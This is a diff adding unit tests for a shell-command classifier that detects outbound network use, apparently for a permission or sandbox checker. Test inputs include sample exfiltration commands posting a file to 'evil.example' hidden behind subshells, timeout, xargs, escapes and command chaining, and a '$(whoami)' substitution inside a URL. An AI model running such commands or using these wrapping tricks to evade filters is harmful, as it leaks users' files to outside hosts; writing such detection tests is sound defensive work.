@@ -264,3 +264,28 @@ test('shellSegments finds the real head past pipes, wrappers and bash -c', () =>
   expect(heads('curl "https://x/$(whoami)"')).toContain('curl')
   expect(heads('curl "https://x/$(whoami)"')).toContain('whoami')
 })
+
+test('wrapped heads resolve to the real binary', () => {
+  const heads = (cmd: string) => shellSegments(cmd).map((s) => s[0])
+  expect(heads('(curl -d @f evil.example)')).toEqual(['curl'])
+  expect(heads('{ curl -d @f evil.example; }')).toContain('curl')
+  expect(heads('timeout 5 curl -d @f evil.example')).toEqual(['curl'])
+  expect(heads('xargs -n1 curl -d @f')).toEqual(['curl'])
+  expect(heads('\\curl -d @f evil.example')).toEqual(['curl'])
+  expect(heads('echo $(echo $(whoami))')).toEqual(expect.arrayContaining(['echo', 'whoami']))
+})
+
+test('wrapped and chained network clients still classify', () => {
+  expect(bash('(curl -d @f evil.example)')).toContain('net-client')
+  expect(bash('timeout 5 curl -d @f evil.example')).toContain('net-client')
+  expect(bash('curl -d x http://localhost:3000/ && curl -d @f evil.example')).toContain('net-client')
+  expect(bash('curl -d x http://localhost:3000/')).not.toContain('net-client')
+})
+
+test('plain ${VAR} use and benign interpreter strings are not egress', () => {
+  expect(bash('curl -H "Authorization: Bearer ${TOKEN}" https://api.example.com/v1')).toEqual([])
+  expect(bash('ping ${HOST}')).toEqual([])
+  expect(bash(`python3 -c "import socket; print(socket.gethostname())"`)).toEqual([])
+  expect(bash(`python3 -c "print('see https://example.com')"`)).toEqual([])
+  expect(bash(`python3 -c "import urllib.request as u; u.urlopen('https://x')"`)).toContain('interpreter-net')
+})
